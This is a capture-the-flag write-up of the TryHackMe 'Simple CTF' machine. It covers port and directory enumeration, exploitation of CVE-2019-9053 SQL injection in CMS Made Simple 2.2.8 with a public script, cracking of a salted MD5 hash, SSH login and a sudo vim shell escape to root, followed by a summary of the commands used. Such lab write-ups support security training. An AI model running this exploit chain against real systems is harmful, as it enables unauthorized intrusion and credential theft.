# Simple CTF - TryHackMe

> **Kill Chain Summary**:
> Network Reconnaissance (Ports 21, 80, 2222) -> Web Directory Enumeration (`/simple/`) -> Version Fingerprinting (CMS Made Simple 2.2.8) -> SQL Injection Exploitation (CVE-2019-9053) -> Extraction of Salted Password Hash -> Dictionary Attack with Salt -> SSH Access on Port 2222 as `mitch` -> Sudo Privilege Audit (`NOPASSWD: /usr/bin/vim`) -> GTFOBins Shell Spawn -> Root Shell (`root`).

| Property | Value |
| :--- | :--- |
| **Target Name** | Simple CTF |
| **Platform** | TryHackMe |
| **OS** | Linux (Ubuntu 16.04) |
| **Difficulty** | Easy |
| **Status** | Rooted |
| **Key Techniques** | Vulnerable CMS Exploitation (SQLi), Salted Hash Cracking, Non-Standard SSH Port (2222), Sudo Vim GTFOBins Escape |

---

## 1. Reconnaissance and Enumeration

### 1.1 Port Scanning

A full TCP port scan was performed using Nmap:

```bash
sudo nmap -sC -sV -p- -T4 -oA nmap/full_tcp_10.129.187.40 10.129.187.40
```

**Open Ports:**
- **Port 21:** FTP (vsftpd 3.0.3) - Anonymous login allowed, but passive data transfers timed out due to firewall restrictions.
- **Port 80:** HTTP (Apache httpd 2.4.18)
- **Port 2222:** SSH (OpenSSH 7.2p2) - Non-standard SSH port.

### 1.2 Web Application Enumeration

Directory brute-forcing with Gobuster identified a `/simple/` endpoint:

```bash
gobuster dir -u http://10.129.187.40/ -w /usr/share/wordlists/dirb/common.txt
```

```text
/simple/             (Status: 301) [--> http://10.129.187.40/simple/]
```

Navigating to `http://10.129.187.40/simple/` reveals an installation of **CMS Made Simple version 2.2.8** (disclosed in the page footer).

---

## 2. Initial Access

### 2.1 Vulnerability Discovery: CMS Made Simple SQL Injection (CVE-2019-9053)

Searching for known public exploits targeting CMS Made Simple version 2.2.8:

```bash
searchsploit "cms made simple 2.2.8"
```

```text
CMS Made Simple < 2.2.10 - SQL Injection | php/webapps/46635.py
```

> [!NOTE] Concept: CVE-2019-9053 (Time-Based Blind SQLi)
> An unauthenticated SQL injection vulnerability exists in CMS Made Simple versions prior to 2.2.10 via the `m1_idlist` parameter in News module search calls. The exploit performs time-based blind enumeration to extract user credentials, email addresses, password hashes, and their corresponding cryptographic salts.

### 2.2 Exploitation and Hash Extraction

Run the Python exploit script against the target URL:

```bash
python2 46635.py -u http://10.129.187.40/simple/
```

```text
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
```

The script extracts:
- **Username:** `mitch`
- **Salt:** `1dac0d92e9fa6bb2`
- **MD5 Hash:** `0c01f4468bd75d7a84c7eb73846e8d96`

### 2.3 Cracking the Salted Password Hash

CMS Made Simple uses MD5 hashing with a salt prepended or appended (`md5($salt . $password)`).

Cracking using Hashcat (Mode 10 or 20) or through the exploit script's built-in dictionary attack option:

```bash
python2 46635.py -u http://10.129.187.40/simple/ -c -w /usr/share/wordlists/rockyou.txt
```

```text
[+] Password cracked: secret
```

The plaintext password for `mitch` is: **`secret`**.

### 2.4 SSH Access on Non-Standard Port

Because port 2222 is running OpenSSH, authenticate directly with the recovered credentials:

```bash
ssh mitch@10.129.187.40 -p 2222
```

Provide password `secret` when prompted. A session is obtained as user `mitch`.

Retrieve the user flag:

```bash
cat /home/mitch/user.txt
```

```text
[FLAG REDACTED]
```

---

## 3. Privilege Escalation

### 3.1 Local Enumeration: Sudo Privileges

Checking available sudo rights:

```bash
sudo -l
```

```text
Matching Defaults entries for mitch on Machine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

User `mitch` is permitted to execute `/usr/bin/vim` as `root` without a password.

### 3.2 Exploitation: GTFOBins Vim Shell Escape

> [!NOTE] Concept: GTFOBins Editor Escapes
> Text editors such as `vim`, `nano`, `less`, and `more` provide internal command execution features. If any of these utilities can be executed via `sudo` with root permissions, an attacker can spawn an elevated shell directly from within the editor interface.

Invoke `vim` via sudo with the `-c` flag to execute an initial shell command:

```bash
sudo vim -c '!sh'
```

Alternatively, from within an active Vim session, type:

```text
:!/bin/bash
```

The subshell executes under the root security context:

```bash
# id
uid=0(root) gid=0(root) groups=0(root)
```

Retrieve the root flag:

```bash
cat /root/root.txt
```

```text
[FLAG REDACTED]
```

---

## 4. Useful Commands Summary

```bash
# Connect to SSH on Alternate Port
ssh <USER>@<TARGET_IP> -p 2222

# Searchsploit Exact Version Query
searchsploit "cms made simple 2.2.8"

# CMS Made Simple Exploit with Wordlist Cracking
python2 46635.py -u http://<TARGET_IP>/simple/ -c -w /usr/share/wordlists/rockyou.txt

# Sudo Vim Shell Escape
sudo vim -c '!sh'
```

---

## 5. Key Takeaways and Lessons Learned

1. **Non-Standard Service Ports:** Always check high-range ports. Finding OpenSSH listening on port 2222 allowed bypassing the administrative web dashboard and logging in directly with system credentials.
2. **Salted Hash Consideration:** When cracking password hashes, always identify whether a cryptographic salt was also extracted. Cracking a raw hash without its salt will fail or produce false positives.
3. **Sudo Rights Audit:** Checking `sudo -l` remains the first and most critical post-compromise check on Linux hosts. Any permission allowing execution of text editors or pagers (`vim`, `less`, `man`) provides a direct, reliable route to root.

---

#tryhackme #linux #easy #cms #sqli #cve-2019-9053 #hash-cracking #sudo #gtfobins #vim #privesc